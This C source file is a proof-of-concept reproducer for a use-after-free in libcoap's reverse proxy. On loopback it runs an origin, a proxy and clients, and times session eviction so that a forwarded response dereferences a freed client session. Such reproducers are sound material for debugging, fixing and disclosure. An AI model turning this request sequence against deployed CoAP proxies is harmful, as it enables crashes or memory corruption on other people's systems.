/* Native reproducer for libcoap proxy UAF of the incoming client session; REGISTER_EVT toggles Bug A vs Bug B. */
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <coap3/coap.h>

#define ORIGIN_PORT 5701
#define PROXY_PORT  5700

static coap_proxy_server_t      rp_entry;
static coap_proxy_server_list_t reverse_proxy = {
    &rp_entry, 1, 0,
    COAP_PROXY_REVERSE,
    0,
    0
};

static void
origin_get(coap_resource_t *resource COAP_UNUSED,
           coap_session_t *session COAP_UNUSED,
           const coap_pdu_t *request COAP_UNUSED,
           const coap_string_t *query COAP_UNUSED,
           coap_pdu_t *response) {
  coap_pdu_set_code(response, COAP_RESPONSE_CODE_CONTENT);
  coap_add_data(response, 13, (const uint8_t *)"upstream-data");
}

static void
proxy_handler(coap_resource_t *resource,
              coap_session_t *session,
              const coap_pdu_t *request,
              const coap_string_t *query COAP_UNUSED,
              coap_pdu_t *response) {
  if (!coap_proxy_forward_request(session, request, response, resource,
                                  NULL, &reverse_proxy))
    fprintf(stderr, "[proxy] forward_request failed\n");
}

static coap_response_t
proxy_response(coap_session_t *session, const coap_pdu_t *sent COAP_UNUSED,
               const coap_pdu_t *received, const coap_mid_t id COAP_UNUSED) {
  fprintf(stderr, "[proxy] upstream response -> forwarding to (freed?) client\n");
  return coap_proxy_forward_response(session, received, NULL);
}

static int proxy_event(coap_session_t *session COAP_UNUSED, coap_event_t ev COAP_UNUSED) {
  return 0;
}

static coap_context_t *
make_server(uint16_t port) {
  coap_context_t *ctx = coap_new_context(NULL);
  coap_address_t a;
  coap_address_init(&a);
  a.addr.sin.sin_family = AF_INET;
  a.addr.sin.sin_port = htons(port);
  a.addr.sin.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  if (!coap_new_endpoint(ctx, &a, COAP_PROTO_UDP)) {
    fprintf(stderr, "endpoint on %u failed\n", port);
    exit(1);
  }
  return ctx;
}

static coap_session_t *
make_client(coap_context_t *ctx, uint16_t dst_port) {
  coap_address_t d;
  coap_address_init(&d);
  d.addr.sin.sin_family = AF_INET;
  d.addr.sin.sin_port = htons(dst_port);
  d.addr.sin.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  return coap_new_client_session(ctx, NULL, &d, COAP_PROTO_UDP);
}

static void
send_get(coap_session_t *s, const uint8_t *tok, size_t toklen) {
  coap_pdu_t *p = coap_new_pdu(COAP_MESSAGE_CON, COAP_REQUEST_CODE_GET, s);
  coap_add_token(p, toklen, tok);
  coap_add_option(p, COAP_OPTION_URI_PATH, 4, (const uint8_t *)"test");
  coap_send(s, p);
}

static void pump(int n, coap_context_t **ctxs) {
  for (int i = 0; i < n; i++)
    for (coap_context_t **c = ctxs; *c; c++)
      coap_io_process(*c, COAP_IO_NO_WAIT);
}

int
main(void) {
  coap_startup();
  coap_set_log_level(COAP_LOG_WARN);

  static uint8_t uri_buf[] = "coap://127.0.0.1:5701";
  coap_uri_t uri;
  if (coap_split_uri(uri_buf, strlen((char *)uri_buf), &uri) < 0) {
    fprintf(stderr, "split_uri failed\n");
    return 1;
  }
  rp_entry.uri = uri;

  coap_context_t *origin = make_server(ORIGIN_PORT);
  coap_resource_t *ores =
      coap_resource_init(coap_make_str_const("test"), 0);
  coap_register_request_handler(ores, COAP_REQUEST_GET, origin_get);
  coap_add_resource(origin, ores);

  coap_context_t *proxy = make_server(PROXY_PORT);
  coap_context_set_max_idle_sessions(proxy, 1);
  coap_resource_t *pres = coap_resource_reverse_proxy_init(proxy_handler, 0);
  coap_add_resource(proxy, pres);
  coap_register_response_handler(proxy, proxy_response);
  if (getenv("REGISTER_EVT")) {
    coap_register_event_handler(proxy, proxy_event);
    fprintf(stderr, "[repro] event handler REGISTERED (proxy cleanup path active)\n");
  } else {
    fprintf(stderr, "[repro] NO event handler (proxy cleanup gated-off)\n");
  }

  coap_context_t *client = coap_new_context(NULL);

  /* Phase 1: S issues two requests; ORIGIN not pumped -> two req entries, both S. */
  coap_session_t *S = make_client(client, PROXY_PORT);
  send_get(S, (const uint8_t *)"\x11\x11\x11\x11", 4);
  send_get(S, (const uint8_t *)"\x22\x22\x22\x22", 4);
  {
    coap_context_t *cp[] = {client, proxy, NULL};
    pump(12, cp);
  }
  fprintf(stderr, "[repro] phase1 done: 2 requests forwarded, origin held\n");

  /* Phase 2: second client evicts+frees S; cleanup removes only the first entry. */
  coap_session_t *S2 = make_client(client, PROXY_PORT);
  send_get(S2, (const uint8_t *)"\x33\x33\x33\x33", 4);
  {
    coap_context_t *cp[] = {client, proxy, NULL};
    pump(12, cp);
  }
  fprintf(stderr, "[repro] phase2 done: S2 sent -> S should be evicted+freed\n");

  /* Phase 3: ORIGIN answers -> surviving response derefs freed S -> UAF. */
  {
    coap_context_t *all[] = {origin, proxy, client, NULL};
    pump(40, all);
  }
  fprintf(stderr, "[repro] phase3 done (if you see this with no ASan report, "
                  "the UAF did not trigger this run)\n");

  coap_free_context(client);
  coap_free_context(proxy);
  coap_free_context(origin);
  
  coap_cleanup();
  return 0;
}
